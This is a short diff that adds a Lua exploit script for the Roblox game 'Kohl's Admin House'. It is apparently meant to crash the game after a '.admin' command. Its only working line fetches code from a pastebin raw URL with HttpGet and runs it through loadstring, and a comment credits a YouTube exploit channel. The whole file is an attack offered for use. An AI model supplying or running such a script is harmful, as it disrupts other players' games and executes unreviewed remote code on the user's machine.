@@ -1,0 +1,5 @@
+-- only for kohls admin house
+-- use .admin before .crash or it wont work
+ loadstring(game:HttpGet("https://pastebin.com/raw/ywuWNMKx"))()
+ 
+ -- credits nto exploits on youtube
